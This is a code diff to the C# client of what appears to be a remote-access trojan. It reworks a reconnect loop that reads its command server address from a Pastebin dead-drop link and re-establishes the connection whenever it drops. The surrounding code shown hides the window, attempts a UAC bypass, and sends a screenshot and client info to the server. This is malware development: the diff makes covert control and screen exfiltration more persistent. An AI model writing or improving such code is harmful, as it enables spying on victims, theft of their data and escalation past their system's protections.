@@ -89,23 +89,25 @@ public static class GClass
         ShowWindow(handle, show ? SW_SHOW : SW_HIDE);
     }
 
-    public static async Task ReconnectLoop(LazyServerClient client)
+    public static async Task ReconnectLoop(Func<LazyServerClient> clientFactory)
     {
         var server = (string)config()["server"];
         var port = (int)config()["port"];
 
-        if ((bool)config()["pastebin"]) {
+        if ((bool)config()["pastebin"])
+        {
             try
             {
                 string pastebinres = await new HttpClient().GetStringAsync((string)config()["pastebinlink"]);
-                if (!String.IsNullOrEmpty(pastebinres))
+                if (!string.IsNullOrEmpty(pastebinres))
                 {
                     string[] strings = pastebinres.Split(':');
-
                     server = strings[0];
-                    port = Int32.Parse(strings[1]);
-                };
-            } catch {
+                    port = int.Parse(strings[1]);
+                }
+            }
+            catch
+            {
                 server = (string)config()["server"];
                 port = (int)config()["port"];
             }
@@ -113,19 +115,27 @@ public static class GClass
 
         while (true)
         {
+            LazyServerClient client = clientFactory();
+            client.Disconnected += async (_, __) =>
+            {
+                Console.WriteLine("Lost connection, reconnecting...");
+                await ReconnectLoop(clientFactory); // restart the loop
+            };
+
             try
             {
                 await client.ConnectAsync(server, port);
-                break;
+                Console.WriteLine("Connected!");
+                break; // If you want *only startup reconnect*, keep this. If you want permanent, remove it.
             }
             catch
             {
                 Console.WriteLine("Retrying connection in 1 second...");
-                await Task.Delay(300);
-                Console.WriteLine("haha i lied, retrying connection NOW");
+                await Task.Delay(1000);
             }
         }
     }
+
 
     public static async Task<string> GetIp()
     {
@@ -269,7 +279,7 @@ public static class GClass
         {
             Console.WriteLine("UAC Bypass failed.");
             await Task.Delay(3000);
-            await ReconnectLoop(client);
+            await GClass.ReconnectLoop(() => new LazyServerClient());
 
             var info = await BuildClientInfo();
             await client.SendFileViaUdp(screenshot, info.ToString());
